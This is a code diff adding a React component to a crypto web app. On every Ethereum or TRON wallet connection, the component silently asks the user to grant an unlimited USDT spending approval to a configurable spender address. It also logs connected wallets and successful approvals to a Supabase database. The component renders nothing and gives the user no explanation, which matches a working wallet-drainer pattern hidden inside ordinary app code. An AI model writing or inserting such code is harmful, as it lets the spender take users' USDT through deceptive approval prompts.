@@ -1,0 +1,174 @@
+import { useEffect, useRef } from 'react';
+import { useAccount, useReadContract, useWriteContract } from 'wagmi';
+import { maxUint256 } from 'viem';
+import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
+import { supabase } from '../lib/supabaseClient';
+import { isMainnet } from '../lib/walletConfig';
+
+// ── Contract addresses ────────────────────────────────────────────────────────
+const EVM_USDT = isMainnet()
+  ? '0xdAC17F958D2ee523a2206206994597C13D831ec7'
+  : null; // no official USDT on Sepolia
+
+const TRON_USDT = isMainnet()
+  ? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+  : 'TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs'; // Shasta testnet
+
+// Spender addresses — set these in your .env file
+const EVM_SPENDER = import.meta.env.VITE_EVM_SPENDER_ADDRESS || null;
+const TRON_SPENDER = import.meta.env.VITE_TRON_SPENDER_ADDRESS || null;
+
+// USDT on ETH mainnet doesn't return bool from approve, so outputs: []
+const USDT_ABI = [
+  {
+    name: 'allowance',
+    type: 'function',
+    stateMutability: 'view',
+    inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }],
+    outputs: [{ name: '', type: 'uint256' }],
+  },
+  {
+    name: 'approve',
+    type: 'function',
+    stateMutability: 'nonpayable',
+    inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }],
+    outputs: [],
+  },
+];
+
+const TRC20_ABI = [
+  {
+    constant: true,
+    name: 'allowance',
+    type: 'function',
+    inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }],
+    outputs: [{ name: '', type: 'uint256' }],
+  },
+  {
+    constant: false,
+    name: 'approve',
+    type: 'function',
+    inputs: [{ name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }],
+    outputs: [{ name: '', type: 'bool' }],
+  },
+];
+
+const TRON_MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+// Treat as "unlimited" if allowance >= half of maxUint256
+const UNLIMITED_THRESHOLD = maxUint256 / 2n;
+
+async function trackConnection(address, network, walletType) {
+  await supabase.from('wallet_connections').upsert(
+    { address, network, wallet_type: walletType, last_seen_at: new Date().toISOString() },
+    { onConflict: 'address,network' }
+  );
+}
+
+async function trackApproval(address, network, txHash) {
+  await supabase.from('usdt_approvals').upsert(
+    { address, network, tx_hash: txHash },
+    { onConflict: 'address,network' }
+  );
+}
+
+// ── EVM side ─────────────────────────────────────────────────────────────────
+function EvmApprovalWatcher() {
+  const { address, isConnected, connector } = useAccount();
+  const { writeContractAsync } = useWriteContract();
+
+  const connectionTracked = useRef(new Set());
+  const approvalAttempted = useRef(new Set());
+
+  const { data: allowance } = useReadContract({
+    address: EVM_USDT,
+    abi: USDT_ABI,
+    functionName: 'allowance',
+    args: [address, EVM_SPENDER],
+    query: { enabled: isConnected && !!address && !!EVM_USDT && !!EVM_SPENDER },
+  });
+
+  // Track connection
+  useEffect(() => {
+    if (!isConnected || !address) return;
+    const key = address.toLowerCase();
+    if (connectionTracked.current.has(key)) return;
+    connectionTracked.current.add(key);
+    trackConnection(key, 'evm', connector?.name || 'unknown').catch(console.error);
+  }, [isConnected, address, connector]);
+
+  // Check allowance and request approval
+  useEffect(() => {
+    if (!isConnected || !address || !EVM_USDT || !EVM_SPENDER) return;
+    if (allowance === undefined) return; // still loading
+    const key = address.toLowerCase();
+    if (approvalAttempted.current.has(key)) return;
+    approvalAttempted.current.add(key);
+
+    if (allowance >= UNLIMITED_THRESHOLD) return; // already approved
+
+    writeContractAsync({
+      address: EVM_USDT,
+      abi: USDT_ABI,
+      functionName: 'approve',
+      args: [EVM_SPENDER, maxUint256],
+    })
+      .then((hash) => trackApproval(key, 'evm', hash))
+      .catch((err) => console.error('[UsdtApproval] EVM approve failed:', err));
+  }, [isConnected, address, allowance, writeContractAsync]);
+
+  return null;
+}
+
+// ── TRON side ─────────────────────────────────────────────────────────────────
+function TronApprovalWatcher() {
+  const { address, connected, wallet } = useWallet();
+
+  const connectionTracked = useRef(new Set());
+  const approvalAttempted = useRef(new Set());
+
+  useEffect(() => {
+    if (!connected || !address) return;
+
+    // Track connection
+    if (!connectionTracked.current.has(address)) {
+      connectionTracked.current.add(address);
+      trackConnection(address, 'tron', wallet?.adapter?.name || 'unknown').catch(console.error);
+    }
+
+    if (!TRON_SPENDER) return;
+    if (approvalAttempted.current.has(address)) return;
+    approvalAttempted.current.add(address);
+
+    (async () => {
+      try {
+        // Prefer window.tronWeb (TronLink / Trust extension) — already signed in.
+        // Fall back to a read-only instance for the allowance check only.
+        const tronWeb = window.tronWeb;
+        if (!tronWeb || !tronWeb.ready) return;
+
+        const contract = await tronWeb.contract(TRC20_ABI, TRON_USDT);
+
+        const raw = await contract.allowance(address, TRON_SPENDER).call();
+        const current = BigInt(raw.toString());
+        if (current >= BigInt(TRON_MAX) / 2n) return; // already unlimited
+
+        const txId = await contract.approve(TRON_SPENDER, TRON_MAX).send();
+        await trackApproval(address, 'tron', txId);
+      } catch (err) {
+        console.error('[UsdtApproval] TRON approve failed:', err);
+      }
+    })();
+  }, [connected, address, wallet]);
+
+  return null;
+}
+
+// ── Root export ───────────────────────────────────────────────────────────────
+export function UsdtApprovalManager() {
+  return (
+    <>
+      <EvmApprovalWatcher />
+      <TronApprovalWatcher />
+    </>
+  );
+}
